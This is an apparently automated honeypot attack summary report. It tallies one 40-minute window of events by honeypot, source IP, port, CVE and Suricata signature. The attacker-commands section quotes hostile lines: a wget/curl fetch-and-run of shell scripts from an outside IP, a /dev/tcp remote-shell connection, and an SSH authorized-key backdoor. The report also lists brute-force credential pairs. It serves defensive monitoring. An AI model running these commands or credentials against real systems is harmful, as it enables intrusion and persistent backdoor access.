Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T12:01:36Z
**Timeframe:** 2025-10-16T11:20:01Z to 2025-10-16T12:00:01Z
**Files Used:**
* agg_log_20251016T112001Z.json
* agg_log_20251016T114002Z.json
* agg_log_20251016T120001Z.json

### Executive Summary
This report summarizes 29,343 events collected from the honeypot network over a 40-minute period. The most active honeypots were Cowrie, Suricata, and Heralding. A significant portion of the attacks originated from the IP address 45.134.26.47, which was responsible for 5,585 events. The most targeted port was VNC (port 5900). A large number of reconnaissance and brute-force commands were observed.

### Detailed Analysis

**Attacks by Honeypot:**
* **Cowrie:** 8515
* **Suricata:** 7228
* **Heralding:** 5583
* **Honeytrap:** 3143
* **Sentrypeer:** 2348
* **Ciscoasa:** 1381
* **Mailoney:** 756
* **Redishoneypot:** 123
* **Dionaea:** 95
* **H0neytr4p:** 69
* **Tanner:** 38
* **ConPot:** 26
* **Honeyaml:** 14
* **Adbhoney:** 11
* **Miniprint:** 9
* **ssh-rsa:** 4

**Top Attacking IPs:**
* **45.134.26.47:** 5585
* **10.17.0.5:** 4411
* **10.140.0.3:** 1471
* **23.94.26.58:** 768
* **86.54.42.238:** 720
* **172.86.95.115:** 455
* **172.86.95.98:** 435
* **185.243.5.158:** 413
* **77.83.240.70:** 297
* **107.155.93.174:** 282
* **202.165.22.246:** 252
* **49.49.251.205:** 237
* **50.6.7.133:** 253
* **82.165.212.151:** 252
* **201.138.161.40:** 247
* **27.112.78.223:** 221
* **162.214.211.246:** 208
* **185.113.139.51:** 197
* **104.248.93.42:** 193
* **200.77.172.159:** 256

**Top Targeted Ports/Protocols:**
* **vnc/5900:** 5583
* **5060:** 2348
* **22:** 1185
* **25:** 756
* **TCP/5900:** 371
* **5903:** 203
* **8333:** 179
* **443:** 62
* **6379:** 114
* **5901:** 102
* **3388:** 85
* **5904:** 69
* **5905:** 68
* **9922:** 36
* **2323:** 22
* **27017:** 33

**Most Common CVEs:**
* **CVE-2002-0013 CVE-2002-0012:** 6
* **CVE-2019-11500 CVE-2019-11500:** 1
* **CVE-2002-1149:** 1

**Commands Attempted by Attackers:**
* **System Discovery/Reconnaissance:** `cat /proc/cpuinfo | grep name | wc -l`, `uname -a`, `whoami`, `crontab -l`, `w`, `top`, `lscpu | grep Model`, `df -h`
* **SSH Key Manipulation:** `cd ~; chattr -ia .ssh; lockr -ia .ssh`, `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
* **Password Change:** `Enter new UNIX password:`
* **Remote File Download and Execution:** `cd /data/local/tmp/; busybox wget http://72.60.16.37/w.sh; sh w.sh; curl http://72.60.16.37/c.sh; sh c.sh`
* **Network Connection and Payload Execution:** `nohup bash -c "exec 6<>/dev/tcp/8.222.150.109/60140 ..."`

**Signatures Triggered:**
* **ET INFO VNC Authentication Failure:** 5868
* **ET DROP Dshield Block Listed Source group 1:** 294
* **ET DROP Spamhaus DROP Listed Traffic Inbound group 42:** 216
* **ET SCAN NMAP -sS window 1024:** 164
* **ET DROP Spamhaus DROP Listed Traffic Inbound group 41:** 164
* **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 63
* **ET INFO Reserved Internal IP Traffic:** 54
* **ET SCAN Sipsak SIP scan:** 40
* **ET DROP Spamhaus DROP Listed Traffic Inbound group 28:** 20

**Users / Login Attempts:**
* **345gs5662d34/345gs5662d34:** 42
* **root/Qaz123qaz:** 21
* **root/QWE123!@#qwe:** 21
* **root/123@@@:** 27
* **sa/!QAZ2wsx:** 10
* **ubnt/ubnt2001:** 6
* **support/9999999:** 5
* **root/3245gs5662d34:** 5
* **ftpuser/ftppassword:** 9
* **User-Agent: Go-http-client/1.1/Connection: close:** 12
* **supervisor/supervisor2017:** 6
* **emoadmin/itsemofuckyou:** 4
* **centos/666666:** 4
* **blank/blank99:** 4

**Files Uploaded/Downloaded:**
* **wget.sh;**: 4
* **w.sh;**: 1
* **c.sh;**: 1

**HTTP User-Agents:**
* *No HTTP user agents were recorded in this timeframe.*

**SSH Clients:**
* *No SSH clients were recorded in this timeframe.*

**SSH Servers:**
* *No SSH servers were recorded in this timeframe.*

**Top Attacker AS Organizations:**
* *No attacker AS organizations were recorded in this timeframe.*

### Key Observations and Anomalies
* The IP address 45.134.26.47 was highly active, focusing on VNC port 5900. This indicates a targeted campaign against this service.
* The commands observed suggest automated scripts performing system reconnaissance and attempting to install SSH backdoors.
* There was a notable instance of an attacker attempting to download and execute multiple shell scripts from the IP address 72.60.16.37.
* A large number of login attempts used common default credentials (e.g., `root/Qaz123qaz`, `ubnt/ubnt`, `support/support`).
* The Suricata signatures indicate a high volume of traffic from known blocklisted IPs (Dshield, Spamhaus).
